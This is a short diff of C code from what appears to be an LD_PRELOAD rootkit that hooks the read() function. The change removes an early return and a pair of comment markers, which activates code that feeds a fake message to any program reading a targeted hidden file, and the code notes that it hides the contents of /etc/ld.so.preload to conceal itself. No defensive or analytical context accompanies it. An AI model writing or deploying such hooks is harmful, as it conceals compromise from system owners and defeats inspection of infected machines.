@@ -38,8 +38,6 @@ ssize_t read(int fd, void *buf, size_t count) {
 
         // Check if it's the target file for modification
         if (strcmp(real_path, hidden_file) == 0) {
-            return orig_read(fd, buf, count);
-            /*
             // Avoid recursive calls by checking the flag
             if (is_reading_hidden_file) {
                 return orig_read(fd, buf, count);
@@ -58,7 +56,6 @@ ssize_t read(int fd, void *buf, size_t count) {
             strncpy(buf, message, count);
             is_reading_hidden_file = 0; // Reset flag after reading
             return count; // Return the number of bytes written
-            */
         }
 
         // Hide the contents of /etc/ld.so.preload
